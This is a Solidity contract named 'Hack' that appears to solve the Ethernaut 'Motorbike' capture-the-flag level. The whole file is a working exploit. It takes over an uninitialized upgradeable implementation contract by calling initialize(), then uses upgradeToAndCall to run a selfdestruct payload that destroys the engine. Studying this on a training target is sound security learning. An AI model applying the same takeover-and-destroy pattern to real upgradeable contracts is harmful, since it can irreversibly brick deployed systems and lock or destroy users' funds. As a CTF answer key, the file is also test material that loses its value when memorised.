// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack{
    constructor () {}
    address public motorbike_address;
    address constant ethernaut_address = 0xD991431D8b033ddCb84dAD257f4821E9d5b38C33;
    address constant level_address = 0xf686cF9816bEf8030e03712a7229C5daa8150C0F;

    function attack(
        address engine_address,
        address motorbike_add
    ) public {
        bytes memory data;
        data = abi.encodeWithSignature("createLevelInstance(address)", level_address);
        (bool success, ) = ethernaut_address.call(data);
        require(success,"create level instance failed");

        data = abi.encodeWithSignature("initialize()");
        (success,) = engine_address.call(data);
        require(success, "engine initial failed");

        bytes memory payload = abi.encodeWithSignature("byebye()");
        data = abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(this), payload);
        (success,) = engine_address.call(data);
        require(success, "take_control failed");

        motorbike_address = motorbike_add;
    }
    function submit() public {
        bytes memory data = abi.encodeWithSignature("submitLevelInstance(address)", motorbike_address);
        ethernaut_address.call(data);
    }

    function byebye() public {
        selfdestruct(payable(msg.sender));
    }
}